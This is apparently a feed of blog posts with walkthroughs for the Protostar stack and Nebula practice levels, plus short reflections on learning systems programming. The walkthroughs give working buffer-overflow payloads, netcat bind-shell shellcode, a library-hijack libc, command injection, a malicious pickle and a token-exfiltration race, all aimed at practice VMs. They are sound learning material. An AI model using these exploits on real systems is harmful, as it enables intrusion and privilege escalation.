0xbffff7a0:     0xb7fd7304      0xb7fd6ff4      0x08048430      0xbffff7c8
0xbffff7b0:     0xb7ec5365      0xb7ff1040      0x0804843b      0xb7fd6ff4
0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eacc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
(gdb) p 0xbffff7cc - 0xbffff780
= 76
(gdb) info address win
Symbol &quot;win&quot; is a function at address 0x80483f4.</code></pre>
</div>


<ul>
<li><code>info frame</code>: Shows the normal location of the saved instruction pointer, <code>eip</code>: <code>0xb7eacc76</code>.</li>
<li><code>x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code>0xbffff780</code> with <code>0x414141</code> (AAAA).</li>
<li><code>p 0xbffff7cc - 0xbffff780</code>: Calculates <code>&amp;eip - &amp;buffer</code>, giving an offset to eip.
Using the offset calculated above, <code>eip</code> is redirected to the address of <code>win()</code> function.</li>
</ul>


<div>
  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print 'A'x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
code flow successfully changed
Segmentation fault</code></pre>
</div>


<h2>Stack: Level 5</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code>stack5</code>.</p>

<h3>Utilities</h3>

<p><code>~/nop</code>:</p>

<div>
  <pre><code class='perl'>#!/usr/bin/perl
# Prints argv[0] number of NOP instructions to stdout
print &quot;\x90&quot;x$ARGV[0]</code></pre>
</div>


<p><code>~/envaddr.c</code>:</p>

<div>
  <pre><code class='c'>// Prints the approximate address of an environmental variable
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char **argv) {
    char *addr = getenv(argv[1]);
    if (addr == NULL) {
        printf(&quot;%s not found\n&quot;, argv[1]);
        return 1;
    }
    else {
        printf(&quot;%s is at address %p\n&quot;, argv[1], getenv(argv[1]));
    }
}</code></pre>
</div>


<p>These utilities will be used in future solutions as well.</p>

<h3>Solution</h3>

<h4>Overview</h4>

<p>From a high level, this is our approach:
1. Store the shellcode in an environmental variable.
2. Find the approximate address of the environmental variable on the stack.
3. Overwriting the return address in <code>stack5</code> with the address of the environmental variable, we execute the shellcode.</p>

<p>There are various ways to execute shellcode, but it&rsquo;s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it&rsquo;s larger than the buffer (64 bytes).</p>

<h4>Executing <code>/bin/sh</code></h4>

<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code>/bin//sh -sli</code>.</p>

<div>
  <pre><code class='nasm'>BITS 32

xor eax, eax
push eax
push 0x68732f2f   ; chars for /bin//sh
push 0x6e69622f
mov ebx, esp
push eax
mov edx, esp

push eax
push 0x736c692d   ; -sli flags
push eax
mov ecx, esp
mov al, 11
int 0x80</code></pre>
</div>


<p>We&rsquo;ll overwrite the return address with the address of our shellcode environmental variable.</p>

<div>
  <pre><code class='console'>$ export SC=$(echo -n $(~/nop 100)$(cat /home/user/shell))
$ ~/envaddr SC
SC is at address 0xbffffefa
$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5</code></pre>
</div>


<p>Nothing happened! Let&rsquo;s take a look with GDB.</p>

<div>
  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') &gt; /tmp/sc-shell
[user@protostar:~]$ gdb /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run &lt; /tmp/sc-shell
Starting program: /opt/protostar/bin/stack5 &lt; /tmp/sc-shell
Executing new program: /bin/dash

Program exited normally.</code></pre>
</div>


<p>The shell opens, but it exits immediately. The shellcode is executing, but there&rsquo;s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>

<h4>Opening a shell through netcat</h4>

<p>We know that our shellcode does run, but it can&rsquo;t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We&rsquo;ll use the netcat solution.</p>

<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:</p>

<div>
  <pre><code class='console'>$ echo -ne &quot;\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot; &gt; ~/sc-nc-8080
$ export SC=$(echo -ne $(~/nop 100)$(cat /home/user/sc-nc-8080))
$ ~/envaddr SC
SC is at address 0xbffffece
$ echo -n $(perl -e 'print &quot;\xce\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5
&lt;waiting&gt;</code></pre>
</div>


<p>On another machine, complete the newly waiting connection:</p>

<div>
  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
whoami
root</code></pre>
</div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
    <updated>2012-08-18T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>

<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>

<h1>Solutions</h1>

<h2>Stack: Level 0</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>

<div>
  <pre><code class='console'>$ perl -e &quot;print 'a'x65&quot; | ./stack0
you have changed the 'modified' variable</code></pre>
</div>


<h2>Stack: Level 1</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>

<div>
  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print 'a'x64 . dcba&quot;)
you have correctly got the variable to the right value</code></pre>
</div>




<!-- more -->


<h2>Stack: Level 2</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>

<div>
  <pre><code class='console'>$ export GREENIE=$(echo -e &quot;$(perl -e &quot;print ax64&quot;)\n\r\n\r&quot;)
$ ./stack2
you have correctly modified the variable</code></pre>
</div>


<h2>Stack: Level 3</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>

<div>
  <pre><code class='console'>$ objdump -d ./stack3 | grep win
08048424 &lt;win&gt;:
$ echo -e &quot;$(perl -e &quot;print 'a'x64&quot;)\x24\x84\x04\x08&quot; | ./stack3
calling function pointer, jumping to 08048424
code flow successfully changed</code></pre>
</div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 15-19)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/17/nebula2/"/>
    <updated>2012-08-17T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/17/nebula2</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 &mdash; I was distracted by some other projects.</p>

<h2>Level 15</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code>strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>

<div>
  <pre><code class='console'>$ strace /home/flag15/flag15 2&gt;&amp;1 | less
...
stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
...</code></pre>
</div>


<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn&rsquo;t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>

<!-- more -->


<div>
  <pre><code class='bash'>#!/bin/bash
# /home/level15/flag.sh
getflag &gt; /home/flag15/getflag.log</code></pre>
</div>




<br />


<p><code>~/version</code>: preventing an error about requiring <code>GLIBC_2.0</code>:</p>

<div>
  <pre><code class='text'>GLIBC_2.0 { };</code></pre>
</div>




<br />


<p><code>~/run.sh</code>: A makeshift Makefile that also executes our code.</p>

<div>
  <pre><code class='bash'>#!/bin/bash -ex
# run.sh
gcc -fPIC -g -c -Wall getflag.c
gcc -shared -Wl,-Bstatic,-soname,libc.so.6,--version-script,version -o libc.so.6 getflag.o  -L/usr/lib/i386-linux-gnu -static-libgcc
mv /home/level15/libc.so.6 /var/tmp/flag15/
/home/flag15/flag15
cat /home/flag15/getflag.log</code></pre>
</div>


<p> <br/>
<code>~/getflag.c</code>: another interpretation of &ldquo;libc,&rdquo; but it happens to call <code>execv</code>.</p>

<div>
  <pre><code class='cpp'>#include &lt;stdio.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;unistd.h&gt;

// If this isn't here, we have an error about a missing symbol
void __cxa_finalize(void *d) {
    return;
}

// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html
int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    char *args_new[] = { &quot;/bin/sh&quot;, &quot;/home/level15/flag.sh&quot; };
    execve(&quot;/bin/sh&quot;, args_new);
    return 0;
}</code></pre>
</div>




<div>
  <pre><code class='console'>$ ./run.sh
You have successfully executed getflag on a target account</code></pre>
</div>


<h2>Level 16</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level16">(full)</a>: A Perl script running on port 1616 runs <code>egrep</code> with user input. It has some red herrings about a username and a password, but the goal is to execute arbitrary code.</p>

<p>This solution uses <a href="http://hakipedia.com/index.php/Poison_Null_Byte">null byte injection</a> to execute arbitrary commands on the target account.</p>

<p>There are two parts to the solution:</p>

<ol>
<li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code>/tmp/RUN/</code> (our script) as <code>/*/RUN</code>.</li>
<li>The Perl string doesn&rsquo;t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code>"</code>, &ldquo;<code>\``", and</code>%00`. The last one is the null character in a URL.</li>
</ol>


<div>
  <pre><code class='bash'>#!/bin/bash
# /home/level16/curl
echo $1  # sanity check
url=&quot;http://localhost:1616/index.cgi?username=$1&amp;password=foo&quot;
echo $uri
curl --globoff $3 &quot;$uri&quot;
ls /home/flag16 | grep getflag.log</code></pre>
</div>




<div>
  <pre><code class='bash'>#!/bin/bash
# /tmp/RUN
getflag &gt; /home/flag16/getflag.log</code></pre>
</div>




<div>
  <pre><code class='console'>$ ~/curl ' &quot;`/*/RUN` %00 '
$ cat /home/flag16/getflag.log
You have successfully executed getflag on a target account</code></pre>
</div>


<h2>Level 17</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level17">(full)</a>: A Python script running on port 10007 loads pickled data from input.</p>

<p>The vulnerability of the Python <code>pickle</code> module is <a href="https://www.google.com/search?q=pickle+vulnerability">well-documented</a>. The Python docs say:</p>

<blockquote><p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p></blockquote>

<p><a href="http://nadiana.com/python-pickle-insecure">This article</a> gives us an example of malicious Pickle data.</p>

<p>Our pickled &ldquo;data&rdquo; goes in <code>~/cmd</code>:</p>

<div>
  <pre><code class='text'>cos
system
(S' /tmp/run17'
tR.</code></pre>
</div>


<p>We send the pickled data to the listening script.</p>

<div>
  <pre><code class='console'>$ cat /tmp/run17
#!/bin/bash
getflag &gt; /home/flag17/getflag.log
$ cat cmd | nc localhost 10007
Accepted connection from 127.0.0.1:56228^C
$ cat /home/flag17/getflag.log
You have successfully executed getflag on a target account</code></pre>
</div>


<h3>Interpreting Pickled data</h3>

<p>I was curious about the parts of the malicious pickle. I searched first for the <code>pickle</code> format specification, but I wasn&rsquo;t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>

<blockquote><p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple&hellip;</p></blockquote>

<h2>Level 18</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level18">(full)</a>: <code>flag18</code> is a program that mimics a login shell with various options such as <code>login</code>, <code>logout</code>, <code>shell</code> (see full description). The flag directory contains an unreadable password file.</p>

<h3>Discussion</h3>

<p>This problem was more complex than the others, given the number of options provided initially.</p>

<p>There are flags on <code>flag19</code> for a debug file and a verbose level. Using <code>-d /dev/tty</code> saves us some effort.</p>

<div>
  <pre><code class='console'>$ /home/flag19/flag19 -d /dev/tty -vvvvv
login
got [login] as input
attempting to login</code></pre>
</div>


<p>If we iterate through the possible commands, we can rule out some paths.</p>

<ul>
<li>There&rsquo;s no apparent path for dumping the contents of the password file through the code.</li>
<li>The <code>notsupported()</code> and <code>setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
</ul>


<p>We can confirm this by trying playing around with buffer overflows and format strings:</p>

<div>
  <pre><code class='text'>site exec %s%s%s%s%s  # notsupported() -&gt; prints some of the stack
site exec %n  # notsupported() -&gt; fails with *** %n in writable segment detected ***
setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&gt; exits immediately, detecting buffer overflow</code></pre>
</div>


<h3>Solution</h3>

<p><code>if(fp)</code> will fail if the file can&rsquo;t be opened for any reason. Since the files opened by <code>login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code>fp</code> will then be <code>NULL</code> once the maximum number is reached. Finally, we use <code>closelog</code> to free a file descriptor.</p>

<p>If <code>closelog</code> isn&rsquo;t called, <code>execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code>libncurses.so.5</code>.</p>

<div>
  <pre><code class='console'>$ for i in $(seq 1 2000); do echo &quot;login foo&quot; &gt;&gt; ~/flood; done
$ echo &quot;closelog&quot; &gt;&gt; ~/flood
$ echo &quot;shell&quot; &gt;&gt; ~/flood
$ echo &quot;getflag &gt; /tmp/getflag.log&quot; &gt; /tmp/getflag &amp;&amp; chmod a+x /tmp/getflag</code></pre>
</div>


<p>The initial attempt looks like this:</p>

<div>
  <pre><code class='console'>$ cd /home/flag18/
$ cat ~/flood | ./flag18 -d /dev/tty
...
/home/flag18/flag18: -d: invalid option</code></pre>
</div>


<p><code>sh</code> doesn&rsquo;t have a <code>-d</code> flag. The author left a hint to look at the options in the man page; <code>sh</code> needs an option that ignores the input afterwards.</p>

<div>
  <pre><code class='console'>$ cat ~/flood | ./flag18 --init-file /tmp/getflag -d /dev/tty</code></pre>
</div>


<p>This actually opens a promptless shell reading from stdin.</p>

<div>
  <pre><code class='console'>...
logged in successfully (without password file)
logged in successfully (without password file)
logged in successfully (without password file)
whoami
flag18
cat /home/flag18/password
44226113-d394-4f46-9406-91888128e27a
getflag
You have successfully executed getflag on a target account</code></pre>
</div>


<p>The password doesn&rsquo;t seem to work for logging into the <code>flag18</code> account, but the shell can execute <code>getflag</code>.</p>

<h2>Level 19</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level19">(full)</a>: The <code>flag19</code> executable checks if the root user started the process. If so, then it runs <code>execve</code> on <code>/bin/sh</code>.</p>

<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won&rsquo;t end up taking the class, but I should show my appreciation for the lecture notes &mdash; they&rsquo;re all very well made.</p>

<p>We want to start <code>flag19</code> in an <a href="http://en.wikipedia.org/wiki/Orphan_process">orphan process</a>. An orphan process is claimed by the program <code>init</code> (PID 1), which is owned by root (UID 0). The plan looks like:</p>

<ol>
<li>Use <code>fork()</code> to create a child process, exit the parent process, and <code>sleep()</code> to create an orphan.</li>
<li>Execute <code>/home/flag19/flag19</code> with our arguments The <code>stat</code> should complete successfully, as we control the time of check.</li>
</ol>


<div>
  <pre><code class='c'>// attempt.c

#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main() {
    if (fork() == 0) {
        sleep(10);
        printf(&quot;executing code in orphan…\n&quot;);
        fflush(stdout);
        char *flag19_args[] = { &quot;-c&quot; &quot;/home/level19/run19.sh&quot; };
        execv(&quot;/home/flag19/flag19&quot;, flag19_args);
        return;
    }
    else {
        printf(&quot;returning from parent\n&quot;);
        exit(0);
    }
    printf(&quot;sanity check, outside both - should never happen\n&quot;);
}</code></pre>
</div>




<div>
  <pre><code class='bash'>#!/bin/bash.sh
# /home/level19/run19.sh
# Standard getflag wrapper
file=/home/flag19/getflag19.log
getflag &gt; ${file}
id &gt;&gt; ${file}</code></pre>
</div>




<div>
  <pre><code class='console'>$ gcc -o attempt.c attempt
$ ./attempt
returning from parent
$ executing code in orphan...
$ cat /home/flag19/getflag19.log
You have successfully executed getflag on a target account
uid=1020(level19) ...</code></pre>
</div>


<h3>Tangent</h3>

<p>I ran into an interesting issue caused by laziness (well, in reality, a desire for flexibility).</p>

<p>The code below does <strong>not</strong> run <code>execve</code> as suid. It runs it as the user <code>level19</code> instead of <code>flag19</code>, which may have been caused by passing down <code>envp</code>.</p>

<div>
  <pre><code class='c'>int main(int argc, char **argv, char **envp) {
    if (fork () == 0) {
        // our other code…
        execve(&quot;/home/flag19/flag19&quot;, argv, envp);
    }
}</code></pre>
</div>


<p>This meant that I could conveniently pass arguments through the executable:</p>

<div>
  <pre><code class='text'>gcc attempt.c -o attempt
./attempt &quot;/home/level19/run19.sh&quot;</code></pre>
</div>


<p>Unfortunately, it also meant that <code>getflag</code> wouldn&rsquo;t execute on the correct user.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wrapping up the summer]]></title>
    <link href="http://louisrli.github.io/blog/2012/07/12/scala-and-summer/"/>
    <updated>2012-07-12T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/07/12/scala-and-summer</id>
    <content type="html"><![CDATA[<p>It&rsquo;s one of those posts that relates to everyone, but it had been on the edge of my mind recently. This post, titled the &ldquo;<a href="http://tilomitra.com/the-crazy-world-of-code">Crazy World of Code</a>&rdquo;, appeared on Hacker News a few days ago. It references a comment on a different HN article.</p>

<!-- more -->


<p>This posts nests the comment three levels deep, so I&rsquo;ll include <a href="http://www.zemanta.com/fruitblog/i-bet-you-over-engineered-your-startup/#comment-583120247">the original comment</a>.</p>

<blockquote><p>I agree, I can’t keep up. I just finished learning backbone.js and now I’m found out on that it’s old news, and I should use ember.js, cross that, it has opinions, I should use Meteor, no, AngularJS, no, Tower.js (on node.js), and for html templates I need handlebars, no mustache, wait, DoT.js is better, hang on, why do I need an HTML parser inside the browser? isn’t that what the browser for? so no HTML templates? ok, DOM snippets, fine, Web Components you say? W3C are in the game too? you mean write REGULAR JavaScript like the Google guys? yuck, oh, I just should write it with CofeeScript and it will look ok, not Coffee? Coco? LiveScript?  DART? GWT? ok, let me just go back to Ruby on Rails, oh it doesn’t scale? Grails? Groovy? Roo? too “Springy?” ok, what about node.js? doesn’t scale either?? but I can write client side, server side and mongodb side code in the same language? (but does it have to be JavaScript?) ok, what about PHP, you say it’s not really thread safe? they lie?? ok, let me go back to server coding, it’s still Java right? no? Lisp? oh it’s called Clojure? well, it has a Bridge / protocol buffers / thrift implementation so we can be language agnostic, so we can support our Haskell developers. Or just go with Scala/Lift/Play it’s the BEST framework (Foresquare use it, so it has to be good). of course we won’t do SOAP and will use only JSON RESTful services cause it’s only for banks and Walmart, and god forbid to use a SQL database it will never scale</p></blockquote>

<h2>One project, one language</h2>

<p>This post had me thinking about a related topic. I was talking to one of my coworkers about mailing lists, and he said that he followed the Lua mailing list because he was &ldquo;a big fan of the Lua language.&rdquo;</p>

<p>Again, it&rsquo;s one of those phrases that stick in my head. I&rsquo;ve done about one distinct language per project<sup>1, 2</sup>, but I&rsquo;ve never considered myself a &ldquo;big fan&rdquo; of any as a whole. Each time I start a new project, too, it&rsquo;s hard not to chase the shiny objects. There&rsquo;s a lot out there.</p>

<p>It would be nice to start working toward knowing a language more intimately, like how <a href="http://stackoverflow.com/users/22656/jon-skeet">Jon Skeet</a> knows C#.</p>

<h2>The rest of the summer</h2>

<p>I&rsquo;m giving <a href="http://www.scala-lang.org/">Scala</a> a shot for my &ldquo;standard language.&rdquo;  I&rsquo;ve liked my experiences with both OCaml (functional, statically typed) and Java (object-oriented, compiled, statically typed). It seems like a language that I would really like, though, to clarify, it won&rsquo;t be the right tool for all problems.</p>

<p>I thought deeply about this post because there&rsquo;s two distinct ideas floating in my head, and I&rsquo;m pretty excited to dig into both. I&rsquo;ve read a lot this summer and depended on my internship for &ldquo;doing,&rdquo; but I finally sat down and started thinking about projects that I&rsquo;d like to start.</p>

<p><a href="http://www.amazon.com/Programming-Scala-Comprehensive-Step---Step/dp/0981531644">One last reading</a> for Scala, more exploit-exercises, and these (still under the radar) projects.</p>

<ol>
<li>Way different from one distinct project per language</li>
<li><code>catch (Exception e) { Java, Objective-C }</code></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Beginning of Systems]]></title>
    <link href="http://louisrli.github.io/blog/2012/07/08/systems-prog/"/>
    <updated>2012-07-08T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/07/08/systems-prog</id>
    <content type="html"><![CDATA[<p>That went by fast.</p>

<p>Today, I finished both of my introductions to systems programming: the book <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking &ndash; The Art of Exploitation 2e</a> (since June) and the <a href="http://cs61.seas.harvard.edu/wiki/Schedule">lecture slides</a> (since three weeks ago) for the Harvard systems programming course, CS61. I thought I&rsquo;d commemorate.</p>

<!-- more -->


<p>I actually hadn&rsquo;t realized it until I sat down to write this post, but I&rsquo;m wrapping up my systems introduction unit (in course-speak). The reading ties together nicely with the doing (<a href="http://exploit-exercises.com/">exploit-exercises</a>). I had picked up <em>The Art of Exploitation</em> because it looked interesting, the lecture slides because they would allow me to take more specific computer science courses next semester, and the exercises because they looked fun. These are all somewhat orthogonal to each other.</p>

<p>I am genuinely surprised that I hadn&rsquo;t seen the connection earlier, but these all covered <em>the same subject matter</em>. While reading the last few lecture slides for CS61, I thought, &ldquo;Wait, I&rsquo;m familiar with this already…but how?&rdquo;</p>

<p>I suspect this is just the beginning of my pursuit for systems knowledge. The topic has always <em>theoretically</em> interested me &mdash; if that makes sense. I&rsquo;ve more or less confirmed this. I&rsquo;m excited for courses next semester! (Fall seems to have more choices.)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 10-14)]]></title>
    <link href="http://louisrli.github.io/blog/2012/06/28/nebula1/"/>
    <updated>2012-06-28T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/06/28/nebula1</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p>This is the second post for my solutions of <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a></p>

<h2>Level 10</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level10">(full)</a>: Read a token file with the password to the target account. A suid program uses <code>access()</code> to upload a file to a host.</p>

<p>According to <a href="http://linux.die.net/man/2/access">man access()</a>, there&rsquo;s a race condition with this usage of the function:</p>

<div>
  <pre><code class='console'>man access
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
using open(2) creates a security hole, because the user might exploit the short time interval between
checking and opening the file to manipulate it. For this reason, the use of this system call should be
avoided. (In the example just described, a safer alternative would be to temporarily switch the process's
effective user ID to the real ID and then call open(2).)</code></pre>
</div>




<!-- more -->


<div>
  <pre><code class='bash'>#!/bin/bash -x
 # upload_file.sh
rm ~/foo
for i in `seq 10000`; do echo &quot;placeholder&quot; &gt;&gt; ~/foo; done
/home/flag10/flag10 ~/foo 192.168.1.6
sleep 0.0001
rm ~/foo; ln -s /home/flag10/token ~/foo</code></pre>
</div>


<p>Now, we can run this script repeatedly:</p>

<div>
  <pre><code class='bash'>while true; do ./upload_file.sh; done</code></pre>
</div>


<p>On our local machine (Linux or Mac), we also listen at intervals with <code>netcat</code>:</p>

<div>
  <pre><code class='console'>localmachine$ while true; do sleep 1; nc -l 18211 | grep -v &quot;placeholder&quot;; done
.oO Oo.
.oO Oo.
plac
.oO Oo.
.oO Oo.
.oO Oo.
plac
.oO Oo.
plac
.oO Oo.
plac
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
.oO Oo.</code></pre>
</div>


<p>On the virtual machine:</p>

<div>
  <pre><code class='console'>$ su flag10
Password:
sh-4.2$ getflag</code></pre>
</div>


<h2>Level 11</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level11">(full)</a>: Execute <code>getflag</code> with the given source code.</p>

<div>
  <pre><code class='console'>$ cd ~
$ echo &quot;Content-Length: 1\n\c&quot; &gt; ./foo
$ echo &quot;getflag; whoami&quot; &gt; ./b
$ export PATH=~:$PATH
$ /home/flag11/flag11 &lt; ~/foo
sh: $'b\200\263': command not found
$ /home/flag11/flag11 &lt; ~/foo
sh: $'b\300\241': command not found
$ /home/flag11/flag11 &lt; ~/foo
You have successfully executed getflag on a target account
flag11</code></pre>
</div>


<p>This solution should be examined with the source code <a href="https://gist.github.com/1c924088f3df2ea27e6f#file_level11.c">(gist)</a>.</p>

<p>This level was <em>great</em>.  These are the realizations that lead to a solution:</p>

<ul>
<li>The solution path must end with the <code>system()</code> call in <code>process()</code>.</li>
<li>There are two ways to reach <code>process()</code> via the if-else branch in <code>main()</code>.</li>
<li>The <code>else</code> branch is <em>extremely</em> random. It uses <code>mmap(NULL…)</code> (maps to a random memory address), <code>getrand()</code> (returns a random file descriptor), and XOR encryption.</li>
<li>The <code>if</code> branch is <code>if (fread(buf, length, 1, stdin) != length)</code>. The third argument to <code>fread</code> is the number of members to read. The return value is the number of members read.</li>
<li>Things just got a lot simpler, since <code>length</code> must be 1.</li>
<li><code>process()</code> uses basic XOR encryption with the caveat that the key changes for each letter in the buffer. The buffer only has one letter, and <code>key = 1 &amp; 0xff</code>, which flips the last bit.</li>
<li>Looking at the <a href="http://ascii-table.com">ASCII table</a>, if we want the final buffer to contain <code>b</code> (<code>01100010</code>), the key needs to be applied to <code>01100011</code> (<code>c</code>).</li>
<li>Add an executable named <code>b</code> to the path, and let the program execute it until the buffer, by chance, ends with the string-terminating null byte.</li>
</ul>


<p>While walking to work, I laughed (in advance) thinking that the problem would have a deceivingly simple solution &mdash; and it did.</p>

<h2>Level 12</h2>

